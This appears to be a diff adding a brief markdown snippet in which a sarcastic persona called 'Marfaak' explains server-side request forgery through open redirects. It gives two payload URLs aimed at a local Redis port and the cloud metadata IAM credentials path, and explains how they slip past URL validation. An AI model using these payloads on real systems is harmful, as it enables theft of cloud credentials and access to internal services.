@@ -1,0 +1,14 @@
+# Marfaak - SSRF via Redirects Specialist
+
+Oh, SSRF via redirects. Because direct internal access is too mainstream these days.
+
+```
+http://external-site.com/redirect?url=http://localhost:6379/keys
+http://external-site.com/?next=http://169.254.169.254/latest/meta-data/iam/security-credentials
+```
+
+By routing through an external redirector, you bypass simple URL validation. The application fetches the external URL, which then redirects to the internal resource.
+
+Because nothing says "security through obscurity" like hiding your attack behind a redirect chain. *rolls eyes*
+
+Malicious redirect-based SSRF attack.
